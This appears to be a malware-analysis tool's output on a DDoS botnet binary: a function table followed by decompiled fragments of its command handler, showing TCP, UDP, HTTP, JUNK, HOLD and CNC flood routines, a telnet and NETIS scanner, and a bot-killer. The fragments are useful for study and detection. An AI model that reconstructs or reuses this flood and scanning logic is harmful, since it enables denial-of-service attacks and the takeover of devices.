----------------------------------------------------------------------------------------------
bcopy                                             |3   |136     |0             |0           |
----------------------------------------------------------------------------------------------
hstrerror                                         |1   |143     |0             |0           |
----------------------------------------------------------------------------------------------
__malloc_trim                                     |0   |177     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_sigaddset                                    |2   |150     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_time                                         |1   |147     |0             |0           |
----------------------------------------------------------------------------------------------
mmap                                              |8   |139     |0             |0           |
----------------------------------------------------------------------------------------------
__GI___uClibc_init                                |0   |146     |0             |0           |
----------------------------------------------------------------------------------------------
isspace                                           |1   |137     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_init_mutex                                |1   |136     |0             |0           |
----------------------------------------------------------------------------------------------
__decode_answer                                   |0   |169     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_fwrite                                    |4   |215     |0             |0           |
----------------------------------------------------------------------------------------------
function_8048120                                  |0   |148     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_select                                     |5   |147     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fcntl64                                      |4   |147     |0             |0           |
----------------------------------------------------------------------------------------------
munmap                                            |4   |148     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_adjust_position                           |4   |347     |0             |0           |
----------------------------------------------------------------------------------------------
rand_cmwc                                         |1   |140     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_pipe                                         |1   |150     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_random_r                                     |2   |157     |0             |0           |
----------------------------------------------------------------------------------------------
__malloc_largebin_index                           |0   |155     |0             |0           |
----------------------------------------------------------------------------------------------
__GI___uClibc_fini                                |0   |177     |0             |0           |
----------------------------------------------------------------------------------------------
getuid                                            |0   |147     |0             |0           |
----------------------------------------------------------------------------------------------
getgid                                            |0   |147     |0             |0           |
----------------------------------------------------------------------------------------------
frame_dummy                                       |0   |135     |0             |0           |
----------------------------------------------------------------------------------------------
strtol                                            |3   |136     |0             |0           |
----------------------------------------------------------------------------------------------
__syscall_rt_sigaction                            |5   |147     |0             |0           |
----------------------------------------------------------------------------------------------
ntohl                                             |1   |136     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_execve                                       |1   |154     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_write                                      |3   |147     |0             |0           |
----------------------------------------------------------------------------------------------
__errno_location                                  |1   |136     |0             |0           |
----------------------------------------------------------------------------------------------
__sigaddset                                       |4   |147     |0             |0           |
----------------------------------------------------------------------------------------------
dup2                                              |2   |148     |0             |0           |
----------------------------------------------------------------------------------------------
chdir                                             |1   |147     |0             |0           |
----------------------------------------------------------------------------------------------
__encode_question                                 |0   |161     |0             |0           |
----------------------------------------------------------------------------------------------
__pthread_return_void                             |2   |137     |0             |0           |
----------------------------------------------------------------------------------------------
getBuild                                          |0   |136     |0             |0           |
----------------------------------------------------------------------------------------------
__do_global_dtors_aux                             |0   |167     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_wcommit                                   |1   |148     |0             |0           |
----------------------------------------------------------------------------------------------
__GI__exit                                        |1   |137     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_trans2r_o                                 |4   |209     |0             |0           |
----------------------------------------------------------------------------------------------
printchar                                         |2   |148     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_poll                                       |0   |151     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_lseek64                                    |4   |154     |0             |0           |
----------------------------------------------------------------------------------------------
__sigdelset                                       |2   |147     |0             |0           |
----------------------------------------------------------------------------------------------
_dl_aux_init                                      |0   |138     |0             |0           |
----------------------------------------------------------------------------------------------
wildString                                        |2   |202     |0             |0           |
----------------------------------------------------------------------------------------------
free                                              |1   |333     |0             |0           |
----------------------------------------------------------------------------------------------
_start                                            |1   |141     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_tolower                                      |1   |146     |0             |0           |
----------------------------------------------------------------------------------------------
_load_inttype                                     |0   |188     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_wcsrtombs                                    |0   |140     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_strdup                                       |1   |145     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_rfill                                     |1   |138     |0             |0           |
----------------------------------------------------------------------------------------------
__GI___glibc_strerror_r                           |0   |140     |0             |0           |
----------------------------------------------------------------------------------------------
htonl                                             |0   |137     |0             |0           |
----------------------------------------------------------------------------------------------
prctl                                             |5   |150     |0             |0           |
----------------------------------------------------------------------------------------------
================================================================================
========	FUNCTIONS SUSPECTED INSTRUNCTIONS : ===================================
================================================================================
=================FUNCTION : processCmd ===================
++++++++ FUNCTION START 13668
++++++++ FUNCTION END 23840
++++++++ FUNCTION LENGTH 10172
    int32_t v132 = ((int32_t)(v130 | _strncmp((char *)v128, "PING", 5) % 2 == 0) | v131 & -256) ^ 1; // 0x804fe48
        int32_t v136 = ((int32_t)(v135 | _strncmp((char *)v134, "GETLOCALIP", 11) % 2 == 0) | v132 & -256) ^ 1; // 0x804fea9
            int32_t v139 = ((int32_t)(v138 | _strncmp((char *)v137, "BOTKILL", 8) % 2 == 0) | v136 & -256) ^ 1; // 0x804ff1c
                if (listFork() == 0) {
                    HackerPrint((int32_t)v133, (int32_t)"Killing Bots");
                    botkiller();
                if (listFork() == 0) {
                    HackerPrint((int32_t)v133, (int32_t)"LOOPING PAYLOAD");
            int32_t v145 = ((int32_t)(v144 | _strncmp((char *)v143, "TELNET", 7) % 2 == 0) | v142 & -256) ^ 1; // 0x805000d
                v201 = _strncmp((char *)*a2, "NETIS", 6);
                        HackerPrint((int32_t)v133, (int32_t)"[NETIS] SCANNER Starting");
                        StartTheNetis();
                        v209 = _strncmp((char *)*a2, "UDP", 4);
                            v211 = _strncmp((char *)*a2, "HTTP", 5);
                                            v278 = _strncmp((char *)*a2, "TCP", 4);
                                                    while (true) {
                                                            if (*v296 != __libc_getpid()) {
                                                                kill(v298, 9);
                                                                        v259 = listFork();
                                                                            sendTCP(v270, v271, v272, v273, (char *)v274, v256, v257);
                                                                            while (true) {
                                                                                if (listFork() == 0) {
                                                                                    sendTCP(v299, v271, v272, v273, (char *)v274, v256, v257);
                                                                                while (true) {
                                                                            while (true) {
                                                        result5 = listFork();
                                                            sendSTD(v250, v251, v252);
                                                        v278 = _strncmp((char *)*a2, "TCP", 4);
                                                                while (true) {
                                                                                    v259 = listFork();
                                                                                        sendTCP(v270, v271, v272, v273, (char *)v274, v256, v257);
                                                                                        while (true) {
                                                                                            if (listFork() != 0) {
                                                                                            sendTCP(v277, v271, v272, v273, (char *)v274, v256, v257);
                                                                                        while (true) {
                                                    while (true) {
                                                        if (listFork() == 0) {
                                                            sendSTD(v301, v251, v252);
                                                    v278 = _strncmp((char *)*a2, "TCP", 4);
                                                            while (true) {
                                                                                v259 = listFork();
                                                                                    sendTCP(v270, v271, v272, v273, (char *)v274, v256, v257);
                                                                                    while (true) {
                                                                                        if (listFork() != 0) {
                                                                                        sendTCP(v277, v271, v272, v273, (char *)v274, v256, v257);
                                                                                    while (true) {
                                                    if (listFork() == 0) {
                                                        sendJUNK(v239, v240, v241);
                                                        sendSTD(v239, v240, v241);
                                                        sendHOLD(v239, v240, v241);
                                                        while (true) {
                                                            if (listFork() == 0) {
                                                                sendJUNK(v232, v240, v241);
                                                                sendSTD(v232, v240, v241);
                                                                sendHOLD(v232, v240, v241);
                                                                __libc_close((int32_t)v133);
                                                            v278 = _strncmp((char *)*a2, "TCP", 4);
                                                                    while (true) {
                                                                                        v259 = listFork();
                                                                                            sendTCP(v270, v271, v272, v273, (char *)v274, v256, v257);
                                                                                            while (true) {
                                                                                                if (listFork() != 0) {
                                                                                                sendTCP(v277, v271, v272, v273, (char *)v274, v256, v257);
                                                                                            while (true) {
                                                                            while (true) {
                                                                                if (listFork() != 0) {
                                                                                sendSTD(v253, v251, v252);
                                                                        v278 = _strncmp((char *)*a2, "TCP", 4);
                                                                                while (true) {
                                                                                                    v259 = listFork();
                                                                                                        sendTCP(v270, v271, v272, v273, (char *)v274, v256, v257);
                                                                                                        while (true) {
                                                                                                            if (listFork() != 0) {
                                                                                                            sendTCP(v277, v271, v272, v273, (char *)v274, v256, v257);
                                                                                                        while (true) {
                                                                    result5 = listFork();
                                                                        sendSTD(v250, v251, v252);
                                                        v278 = _strncmp((char *)*a2, "TCP", 4);
                                                                while (true) {
                                                                                    if (listFork() == 0) {
                                                                                        sendTCP(v270, v271, v272, v273, (char *)v274, v256, v257);
                                                                                        while (true) {
                                                                                            if (listFork() != 0) {
                                                                                            sendTCP(v277, v271, v272, v273, (char *)v274, v256, v257);
                                                                                        while (true) {
                                                                        if (listFork() == 0) {
                                                                            sendSTD(v250, v251, v252);
                                                                            while (true) {
                                                                                if (listFork() != 0) {
                                                                                sendSTD(v253, v251, v252);
                                                                        v278 = _strncmp((char *)*a2, "TCP", 4);
                                                                                while (true) {
                                                                                                    if (listFork() == 0) {
                                                                                                        sendTCP(v270, v271, v272, v273, (char *)v274, v256, v257);
                                                                                                        while (true) {
                                                                                                            if (listFork() != 0) {
                                                                                                            sendTCP(v277, v271, v272, v273, (char *)v274, v256, v257);
                                                                                                        while (true) {
                                                    if (listFork() == 0) {
                                                        sendCNC(v226, v227, v228);
                                                        while (true) {
                                                            if (listFork() == 0) {
                                                                sendCNC(v304, v227, v228);
                                                                __libc_close((int32_t)v133);
                                                                v278 = _strncmp((char *)*a2, "TCP", 4);
                                                                        while (true) {
                                                                                            v259 = listFork();
                                                                                                sendTCP(v270, v271, v272, v273, (char *)v274, v256, v257);
                                                                                                while (true) {
                                                                                                    if (listFork() != 0) {
                                                                                                    sendTCP(v277, v271, v272, v273, (char *)v274, v256, v257);
                                                                                                while (true) {
                                                                                result5 = listFork();
                                                                                    sendSTD(v250, v251, v252);
                                                                                    while (true) {
                                                                                        if (listFork() != 0) {
                                                                                        sendSTD(v253, v251, v252);
                                                                                v278 = _strncmp((char *)*a2, "TCP", 4);
                                                                                        while (true) {
                                                                                                            v259 = listFork();
                                                                                                                sendTCP(v270, v271, v272, v273, (char *)v274, v256, v257);
                                                                                                                while (true) {
                                                                                                                    if (listFork() != 0) {
                                                                                                                    sendTCP(v277, v271, v272, v273, (char *)v274, v256, v257);
                                                                                                                while (true) {
                                                                            v234 = listFork();
                                                                                sendJUNK(v239, v240, v241);
                                                                                sendSTD(v239, v240, v241);
                                                                                sendHOLD(v239, v240, v241);
                                                                                while (true) {
                                                                                    if (listFork() != 0) {
                                                                                    sendJUNK(v232, v240, v241);
                                                                                    sendSTD(v232, v240, v241);
                                                                                    sendHOLD(v232, v240, v241);
                                                                                    __libc_close((int32_t)v133);
                                                                                v278 = _strncmp((char *)*a2, "TCP", 4);
                                                                                        while (true) {
                                                                                                            v259 = listFork();
                                                                                                                sendTCP(v270, v271, v272, v273, (char *)v274, v256, v257);
                                                                                                                while (true) {
                                                                                                                    if (listFork() != 0) {
                                                                                                                    sendTCP(v277, v271, v272, v273, (char *)v274, v256, v257);
                                                                                                                while (true) {
                                                                                                result5 = listFork();
                                                                                                    sendSTD(v250, v251, v252);
                                                                                                    while (true) {
                                                                                                        if (listFork() != 0) {
                                                                                                        sendSTD(v253, v251, v252);
                                                                                                v278 = _strncmp((char *)*a2, "TCP", 4);
                                                                                                        while (true) {
                                                                                                                            v259 = listFork();
                                                                                                                                sendTCP(v270, v271, v272, v273, (char *)v274, v256, v257);
                                                                                                                                while (true) {
                                                                                                                                    if (listFork() != 0) {
                                                                                                                                    sendTCP(v277, v271, v272, v273, (char *)v274, v256, v257);
                                                                                                                                while (true) {
                                                            v278 = _strncmp((char *)*a2, "TCP", 4);
                                                                    while (true) {
                                                                                        if (listFork() == 0) {
                                                                                            sendTCP(v270, v271, v272, v273, (char *)v274, v256, v257);
                                                                                            while (true) {
                                                                                                if (listFork() != 0) {
                                                                                                sendTCP(v277, v271, v272, v273, (char *)v274, v256, v257);
                                                                                            while (true) {
                                                                            if (listFork() == 0) {
                                                                                sendSTD(v250, v251, v252);
                                                                                while (true) {
                                                                                    if (listFork() != 0) {
                                                                                    sendSTD(v253, v251, v252);
                                                                            v278 = _strncmp((char *)*a2, "TCP", 4);
                                                                                                        if (listFork() == 0) {
                                                                                                            sendTCP(v270, v271, v272, v273, (char *)v274, v256, v257);
                                                                                                            while (true) {
                                                                                                                if (listFork() != 0) {
                                                                                                                sendTCP(v277, v271, v272, v273, (char *)v274, v256, v257);
                                                                        if (listFork() == 0) {
                                                                            sendJUNK(v239, v240, v241);
                                                                            sendSTD(v239, v240, v241);
                                                                            sendHOLD(v239, v240, v241);
                                                                            while (true) {
                                                                                if (listFork() != 0) {
                                                                                sendJUNK(v232, v240, v241);
                                                                                sendSTD(v232, v240, v241);
                                                                                sendHOLD(v232, v240, v241);
                                                                                __libc_close((int32_t)v133);
                                                                            v278 = _strncmp((char *)*a2, "TCP", 4);
                                                                                                        if (listFork() == 0) {
                                                                                                            sendTCP(v270, v271, v272, v273, (char *)v274, v256, v257);
                                                                                                            while (true) {
                                                                                                                if (listFork() != 0) {
                                                                                                                sendTCP(v277, v271, v272, v273, (char *)v274, v256, v257);
                                                                                            if (listFork() == 0) {
                                                                                                sendSTD(v250, v251, v252);
                                                                                                while (true) {
                                                                                                    if (listFork() != 0) {
                                                                                                    sendSTD(v253, v251, v252);
                                                                                            v278 = _strncmp((char *)*a2, "TCP", 4);
                                                                                                                        if (listFork() == 0) {
                                                                                                                            sendTCP(v270, v271, v272, v273, (char *)v274, v256, v257);
                                                                                                                            while (true) {
                                                                                                                                if (listFork() != 0) {
                                                                                                                                sendTCP(v277, v271, v272, v273, (char *)v274, v256, v257);
                                        if (listFork() == 0) {
                                            sendHTTP(*v165, v197, (int16_t)v196, v194, v193, v191);
                                            while (true) {
                                                if (listFork() == 0) {
                                                    sendHTTP(*v165, v189, (int16_t)v188, v186, v185, v183);
                                                        v278 = _strncmp((char *)*a2, "TCP", 4);
                                                                                    v259 = listFork();
                                                                                        sendTCP(v270, v271, v272, v273, (char *)v274, v256, v257);
                                                                                        while (true) {
                                                                                            if (listFork() != 0) {
                                                                                            sendTCP(v277, v271, v272, v273, (char *)v274, v256, v257);
                                                                        result5 = listFork();
                                                                            sendSTD(v250, v251, v252);
                                                                            while (true) {
                                                                                if (listFork() != 0) {
                                                                                sendSTD(v253, v251, v252);
                                                                        v278 = _strncmp((char *)*a2, "TCP", 4);
                                                                                                    v259 = listFork();
                                                                                                        sendTCP(v270, v271, v272, v273, (char *)v274, v256, v257);
                                                                                                        while (true) {
                                                                                                            if (listFork() != 0) {
                                                                                                            sendTCP(v277, v271, v272, v273, (char *)v274, v256, v257);
                                                                    v234 = listFork();
                                                                        sendJUNK(v239, v240, v241);
                                                                        sendSTD(v239, v240, v241);
                                                                        sendHOLD(v239, v240, v241);
                                                                        while (true) {
                                                                            if (listFork() != 0) {
                                                                            sendJUNK(v232, v240, v241);
                                                                            sendSTD(v232, v240, v241);
                                                                            sendHOLD(v232, v240, v241);
                                                                            __libc_close((int32_t)v133);
                                                                        v278 = _strncmp((char *)*a2, "TCP", 4);
                                                                                                    v259 = listFork();
                                                                                                        sendTCP(v270, v271, v272, v273, (char *)v274, v256, v257);
                                                                                                        while (true) {
                                                                                                            if (listFork() != 0) {
                                                                                                            sendTCP(v277, v271, v272, v273, (char *)v274, v256, v257);
                                                                                        result5 = listFork();
                                                                                            sendSTD(v250, v251, v252);
                                                                                            while (true) {
                                                                                                if (listFork() != 0) {
                                                                                                sendSTD(v253, v251, v252);
                                                                                        v278 = _strncmp((char *)*a2, "TCP", 4);
                                                                                                                    v259 = listFork();
                                                                                                                        sendTCP(v270, v271, v272, v273, (char *)v274, v256, v257);
                                                                                                                        while (true) {
                                                                                                                            if (listFork() != 0) {
                                                                                                                            sendTCP(v277, v271, v272, v273, (char *)v274, v256, v257);
                                                                v217 = listFork();
                                                                    sendCNC(v226, v227, v228);
                                                                    while (true) {
                                                                        if (listFork() != 0) {
                                                                        sendCNC(v229, v227, v228);
                                                                        __libc_close((int32_t)v133);
                                                                        v278 = _strncmp((char *)*a2, "TCP", 4);
                                                                                                    v259 = listFork();
                                                                                                        sendTCP(v270, v271, v272, v273, (char *)v274, v256, v257);
                                                                                                        while (true) {
                                                                                                            if (listFork() != 0) {
                                                                                                            sendTCP(v277, v271, v272, v273, (char *)v274, v256, v257);
                                                                                        result5 = listFork();
                                                                                            sendSTD(v250, v251, v252);
                                                                                            while (true) {
                                                                                                if (listFork() != 0) {
                                                                                                sendSTD(v253, v251, v252);
                                                                                        v278 = _strncmp((char *)*a2, "TCP", 4);
                                                                                                                    v259 = listFork();
                                                                                                                        sendTCP(v270, v271, v272, v273, (char *)v274, v256, v257);
                                                                                                                        while (true) {
                                                                                                                            if (listFork() != 0) {
                                                                                                                            sendTCP(v277, v271, v272, v273, (char *)v274, v256, v257);
                                                                                    v234 = listFork();
                                                                                        sendJUNK(v239, v240, v241);
                                                                                        sendSTD(v239, v240, v241);
                                                                                        sendHOLD(v239, v240, v241);
                                                                                        while (true) {
                                                                                            if (listFork() != 0) {
                                                                                            sendJUNK(v232, v240, v241);
                                                                                            sendSTD(v232, v240, v241);
                                                                                            sendHOLD(v232, v240, v241);
                                                                                            __libc_close((int32_t)v133);
                                                                                        v278 = _strncmp((char *)*a2, "TCP", 4);
                                                                                                                    v259 = listFork();
                                                                                                                        sendTCP(v270, v271, v272, v273, (char *)v274, v256, v257);
                                                                                                                        while (true) {
                                                                                                                            if (listFork() != 0) {
                                                                                                                            sendTCP(v277, v271, v272, v273, (char *)v274, v256, v257);
                                                                                                        result5 = listFork();
                                                                                                            sendSTD(v250, v251, v252);
                                                                                                            while (true) {
                                                                                                                if (listFork() != 0) {
                                                                                                                sendSTD(v253, v251, v252);
                                                                                                        v278 = _strncmp((char *)*a2, "TCP", 4);
                                                                                                                                    v259 = listFork();
                                                                                                                                        sendTCP(v270, v271, v272, v273, (char *)v274, v256, v257);
                                                                                                                                        while (true) {
                                                                                                                                            if (listFork() != 0) {
                                                                                                                                            sendTCP(v277, v271, v272, v273, (char *)v274, v256, v257);
                                                    v278 = _strncmp((char *)*a2, "TCP", 4);
                                                                                if (listFork() == 0) {
                                                                                    sendTCP(v270, v271, v272, v273, (char *)v274, v256, v257);
                                                                                    while (true) {
                                                                                        if (listFork() != 0) {
                                                                                        sendTCP(v277, v271, v272, v273, (char *)v274, v256, v257);
                                                                    if (listFork() == 0) {
                                                                        sendSTD(v250, v251, v252);
                                                                        while (true) {
                                                                            if (listFork() != 0) {
                                                                            sendSTD(v253, v251, v252);
                                                                    v278 = _strncmp((char *)*a2, "TCP", 4);
                                                                                                if (listFork() == 0) {
                                                                                                    sendTCP(v270, v271, v272, v273, (char *)v274, v256, v257);
                                                                                                    while (true) {
                                                                                                        if (listFork() != 0) {
                                                                                                        sendTCP(v277, v271, v272, v273, (char *)v274, v256, v257);
                                                                if (listFork() == 0) {
                                                                    sendJUNK(v239, v240, v241);
                                                                    sendSTD(v239, v240, v241);
                                                                    sendHOLD(v239, v240, v241);
                                                                    while (true) {
                                                                        if (listFork() != 0) {
                                                                        sendJUNK(v232, v240, v241);
                                                                        sendSTD(v232, v240, v241);
                                                                        sendHOLD(v232, v240, v241);
                                                                        __libc_close((int32_t)v133);
                                                                                    if (listFork() == 0) {
                                                                                        sendSTD(v250, v251, v252);
                                                                                        while (true) {
                                                                                            if (listFork() != 0) {
                                                                                            sendSTD(v253, v251, v252);
                                                            if (listFork() == 0) {
                                                                sendCNC(v226, v227, v228);
                                                                while (true) {
                                                                    if (listFork() != 0) {
                                                                    sendCNC(v229, v227, v228);
                                                                    __libc_close((int32_t)v133);
                                                                                    if (listFork() == 0) {
                                                                                        sendSTD(v250, v251, v252);
                                                                                        while (true) {
                                                                                            if (listFork() != 0) {
                                                                                            sendSTD(v253, v251, v252);
                                                                                if (listFork() == 0) {
                                                                                    sendJUNK(v239, v240, v241);
                                                                                    sendSTD(v239, v240, v241);
                                                                                    sendHOLD(v239, v240, v241);
                                                                                    while (true) {
                                                                                        if (listFork() != 0) {
                                                                                        sendJUNK(v232, v240, v241);
                                                                                        sendSTD(v232, v240, v241);
                                                                                        sendHOLD(v232, v240, v241);
                                                                                        __libc_close((int32_t)v133);
                                                                                                    if (listFork() == 0) {
                                                                                                        sendSTD(v250, v251, v252);
                                                                                                        while (true) {
                                                                                                            if (listFork() != 0) {
                                                                                                            sendSTD(v253, v251, v252);
                                                            if (listFork() == 0) {
                                                                sendUDP(v176, v177, v178, v179, v180, v148);
                                                                while (true) {
                                                                    if (listFork() == 0) {
                                                                        sendUDP(v307, v177, v178, v179, v180, v148);
                                                                v211 = _strncmp((char *)*a2, "HTTP", 5);
                                                                                                result5 = listFork();
                                                                                                    sendSTD(v250, v251, v252);
                                                                                                    while (true) {
                                                                                                        if (listFork() != 0) {
                                                                                                        sendSTD(v253, v251, v252);
                                                                                            v234 = listFork();
                                                                                                sendJUNK(v239, v240, v241);
                                                                                                sendSTD(v239, v240, v241);
                                                                                                sendHOLD(v239, v240, v241);
                                                                                                while (true) {
                                                                                                    if (listFork() != 0) {
                                                                                                    sendJUNK(v232, v240, v241);
                                                                                                    sendSTD(v232, v240, v241);
                                                                                                    sendHOLD(v232, v240, v241);
                                                                                                    __libc_close((int32_t)v133);
                                                                                                                result5 = listFork();
                                                                                                                    sendSTD(v250, v251, v252);
                                                                                                                    while (true) {
                                                                                                                        if (listFork() != 0) {
                                                                                                                        sendSTD(v253, v251, v252);
                                                                                        v217 = listFork();
                                                                                            sendCNC(v226, v227, v228);
                                                                                            while (true) {
                                                                                                if (listFork() != 0) {
                                                                                                sendCNC(v229, v227, v228);
                                                                                                __libc_close((int32_t)v133);
                                                                                                                result5 = listFork();
                                                                                                                    sendSTD(v250, v251, v252);
                                                                                                                    while (true) {
                                                                                                                        if (listFork() != 0) {
                                                                                                                        sendSTD(v253, v251, v252);
                                                                                                            v234 = listFork();
                                                                                                                sendJUNK(v239, v240, v241);
                                                                                                                sendSTD(v239, v240, v241);
                                                                                                                sendHOLD(v239, v240, v241);
                                                                                                                while (true) {
                                                                                                                    if (listFork() != 0) {
                                                                                                                    sendJUNK(v232, v240, v241);
                                                                                                                    sendSTD(v232, v240, v241);
                                                                                                                    sendHOLD(v232, v240, v241);
                                                                                                                    __libc_close((int32_t)v133);
                                                                                                                                result5 = listFork();
                                                                                                                                    sendSTD(v250, v251, v252);
                                                                                                                                    while (true) {
                                                                                                                                        if (listFork() != 0) {
                                                                                                                                        sendSTD(v253, v251, v252);
                                                                            v215 = listFork();
                                                                                sendHTTP(*v165, v197, (int16_t)v196, v194, v193, v191);
                                                                                while (true) {
                                                                                    if (listFork() != 0) {
                                                                                    sendHTTP(*v165, v189, (int16_t)v188, v186, v185, v183);
                                                                                                        result5 = listFork();
                                                                                                            sendSTD(v250, v251, v252);
                                                                                                            while (true) {
                                                                                                                if (listFork() != 0) {
                                                                                                                sendSTD(v253, v251, v252);
                                                                                                    v234 = listFork();
                                                                                                        sendJUNK(v239, v240, v241);
                                                                                                        sendSTD(v239, v240, v241);
                                                                                                        sendHOLD(v239, v240, v241);
                                                                                                        while (true) {
                                                                                                            if (listFork() != 0) {
                                                                                                            sendJUNK(v232, v240, v241);
                                                                                                            sendSTD(v232, v240, v241);
                                                                                                            sendHOLD(v232, v240, v241);
                                                                                                            __libc_close((int32_t)v133);
                                                                                                                        result5 = listFork();
                                                                                                                            sendSTD(v250, v251, v252);
                                                                                                                            while (true) {
                                                                                                                                if (listFork() != 0) {
                                                                                                                                sendSTD(v253, v251, v252);
                                                                                                v217 = listFork();
                                                                                                    sendCNC(v226, v227, v228);
                                                                                                    while (true) {
                                                                                                        if (listFork() != 0) {
                                                                                                        sendCNC(v229, v227, v228);
                                                                                                        __libc_close((int32_t)v133);
                                                                                                                        result5 = listFork();
                                                                                                                            sendSTD(v250, v251, v252);
                                                                                                                            while (true) {
                                                                                                                                if (listFork() != 0) {
                                                                                                                                sendSTD(v253, v251, v252);
                                                                                                                    v234 = listFork();
                                                                                                                        sendJUNK(v239, v240, v241);
                                                                                                                        sendSTD(v239, v240, v241);
                                                                                                                        sendHOLD(v239, v240, v241);
                                                                                                                        while (true) {
                                                                                                                            if (listFork() != 0) {
                                                                                                                            sendJUNK(v232, v240, v241);
                                                                                                                            sendSTD(v232, v240, v241);
                                                                                                                            sendHOLD(v232, v240, v241);
                                                                                                                            __libc_close((int32_t)v133);
                                                                                                                                        result5 = listFork();
                                                                                                                                            sendSTD(v250, v251, v252);
                                                                                                                                            while (true) {
                                                                                                                                                if (listFork() != 0) {
                                                                                                                                                sendSTD(v253, v251, v252);
                                                            v211 = _strncmp((char *)*a2, "HTTP", 5);
                                                                                            if (listFork() == 0) {
                                                                                                sendSTD(v250, v251, v252);
                                                                                                while (true) {
                                                                                                    if (listFork() != 0) {
                                                                                                    sendSTD(v253, v251, v252);
                                                                                        if (listFork() == 0) {
                                                                                            sendJUNK(v239, v240, v241);
                                                                                            sendSTD(v239, v240, v241);
                                                                                            sendHOLD(v239, v240, v241);
                                                                                            while (true) {
                                                                                                if (listFork() != 0) {
                                                                                                sendJUNK(v232, v240, v241);
                                                                                                sendSTD(v232, v240, v241);
                                                                                                sendHOLD(v232, v240, v241);
                                                                                                __libc_close((int32_t)v133);
                                                                                                            if (listFork() == 0) {
                                                                                                                sendSTD(v250, v251, v252);
                                                                                                                while (true) {
                                                                                                                    if (listFork() != 0) {
                                                                                                                    sendSTD(v253, v251, v252);
                                                                                    if (listFork() == 0) {
                                                                                        sendCNC(v226, v227, v228);
                                                                                        while (true) {
                                                                                            if (listFork() != 0) {
                                                                                            sendCNC(v229, v227, v228);
                                                                                            __libc_close((int32_t)v133);
                                                                                                        if (listFork() == 0) {
                                                                                                            sendJUNK(v239, v240, v241);
                                                                                                            sendSTD(v239, v240, v241);
                                                                                                            sendHOLD(v239, v240, v241);
                                                                                                            while (true) {
                                                                                                                if (listFork() != 0) {
                                                                                                                sendJUNK(v232, v240, v241);
                                                                                                                sendSTD(v232, v240, v241);
                                                                                                                sendHOLD(v232, v240, v241);
                                                                                                                __libc_close((int32_t)v133);
                                                                        if (listFork() == 0) {
                                                                            sendHTTP(*v165, v197, (int16_t)v196, v194, v193, v191);
                                                                            while (true) {
                                                                                if (listFork() != 0) {
                                                                                sendHTTP(*v165, v189, (int16_t)v188, v186, v185, v183);
                                                                                                if (listFork() == 0) {
                                                                                                    sendJUNK(v239, v240, v241);
                                                                                                    sendSTD(v239, v240, v241);
                                                                                                    sendHOLD(v239, v240, v241);
                                                                                                    while (true) {
                                                                                                        if (listFork() != 0) {
                                                                                                        sendJUNK(v232, v240, v241);
                                                                                                        sendSTD(v232, v240, v241);
                                                                                                        sendHOLD(v232, v240, v241);
                                                                                                        __libc_close((int32_t)v133);
                                                                                            if (listFork() == 0) {
                                                                                                sendCNC(v226, v227, v228);
                                                                                                while (true) {
                                                                                                    if (listFork() != 0) {
                                                                                                    sendCNC(v229, v227, v228);
                                                                                                    __libc_close((int32_t)v133);
                                                                                                                if (listFork() == 0) {
                                                                                                                    sendJUNK(v239, v240, v241);
                                                                                                                    sendSTD(v239, v240, v241);
                                                                                                                    sendHOLD(v239, v240, v241);
                                                                                                                    while (true) {
                                                                                                                        if (listFork() != 0) {
                                                                                                                        sendJUNK(v232, v240, v241);
                                                                                                                        sendSTD(v232, v240, v241);
                                                                                                                        sendHOLD(v232, v240, v241);
                                                                                                                        __libc_close((int32_t)v133);
                                        if (listFork() == 0) {
                                            sendJUNK(v170, v171, v172);
                                            while (true) {
                                                if (listFork() == 0) {
                                                    sendJUNK(v309, v171, v172);
                                                    __libc_close((int32_t)v133);
                                            v209 = _strncmp((char *)*a2, "UDP", 4);
                                                v211 = _strncmp((char *)*a2, "HTTP", 5);
                                                                            v234 = listFork();
                                                                                sendJUNK(v239, v240, v241);
                                                                                sendSTD(v239, v240, v241);
                                                                                sendHOLD(v239, v240, v241);
                                                                                while (true) {
                                                                                    if (listFork() != 0) {
                                                                                    sendJUNK(v232, v240, v241);
                                                                                    sendSTD(v232, v240, v241);
                                                                                    sendHOLD(v232, v240, v241);
                                                                                    __libc_close((int32_t)v133);
                                                                        v217 = listFork();
                                                                            sendCNC(v226, v227, v228);
                                                                            while (true) {
                                                                                if (listFork() != 0) {
                                                                                sendCNC(v229, v227, v228);
                                                                                __libc_close((int32_t)v133);
                                                                                            v234 = listFork();
                                                                                                sendJUNK(v239, v240, v241);
                                                                                                sendSTD(v239, v240, v241);
                                                                                                sendHOLD(v239, v240, v241);
                                                                                                while (true) {
                                                                                                    if (listFork() != 0) {
                                                                                                    sendJUNK(v232, v240, v241);
                                                                                                    sendSTD(v232, v240, v241);
                                                                                                    sendHOLD(v232, v240, v241);
                                                                                                    __libc_close((int32_t)v133);
                                                            v215 = listFork();
                                                                sendHTTP(*v165, v197, (int16_t)v196, v194, v193, v191);
                                                                while (true) {
                                                                    if (listFork() != 0) {
                                                                    sendHTTP(*v165, v189, (int16_t)v188, v186, v185, v183);
                                                                                    v234 = listFork();
                                                                                        sendJUNK(v239, v240, v241);
                                                                                        sendSTD(v239, v240, v241);
                                                                                        sendHOLD(v239, v240, v241);
                                                                                        while (true) {
                                                                                            if (listFork() != 0) {
                                                                                            sendJUNK(v232, v240, v241);
                                                                                            sendSTD(v232, v240, v241);
                                                                                            sendHOLD(v232, v240, v241);
                                                                                            __libc_close((int32_t)v133);
                                                                                v217 = listFork();
                                                                                    sendCNC(v226, v227, v228);
                                                                                    while (true) {
                                                                                        if (listFork() != 0) {
                                                                                        sendCNC(v229, v227, v228);
                                                                                        __libc_close((int32_t)v133);
                                                                                                    v234 = listFork();
                                                                                                        sendJUNK(v239, v240, v241);
